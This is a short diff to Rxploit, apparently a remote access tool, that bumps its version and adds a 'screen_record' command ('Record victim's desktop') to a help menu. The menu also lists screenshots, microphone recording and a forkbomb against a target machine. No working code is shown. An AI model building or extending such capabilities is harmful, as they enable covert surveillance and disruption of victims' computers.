@@ -9,7 +9,7 @@ import termcolor
 
 # main veriables
 _author = "Joseph frank"
-_ver = 1.2
+_ver = 1.3
 _github = "https://github.com/JosephFrankFir/Rxploit"
 
 # setup argument
@@ -84,6 +84,7 @@ def target_reqs():
          clear                                  # Clear The Screen
          screenshot                             # Take a Screenshot of The Target Machine
          record *seconds*                       # Record a file using Target Machine microphone
+         screen_record *on*                     # Record victim's desktop
          forkbomb                               # Send forkbomb To The Target Machine
          sysinfo                                # Get Target Machine Info
          cd *Dir Name*                          # Changes Directory On Target Machine
